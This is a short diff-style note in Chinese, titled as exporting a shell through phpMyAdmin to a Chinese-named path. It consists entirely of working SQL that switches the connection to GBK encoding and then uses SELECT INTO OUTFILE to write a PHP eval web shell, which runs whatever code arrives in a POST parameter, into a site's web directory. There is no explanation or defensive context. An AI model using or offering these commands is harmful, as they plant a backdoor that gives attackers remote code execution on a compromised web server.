@@ -1,0 +1,12 @@
+
+phpmyadmin 导出 shell 至中文路径
+
+
+
+set character_set_client='gbk';
+set character_set_connection='gbk';
+set character_set_database='gbk';
+set character_set_results='gbk';
+set character_set_server='gbk';
+select '<?php eval($_POST[cmd]);?>' into outfile 'd:\www\网站\mm.php'; 
+
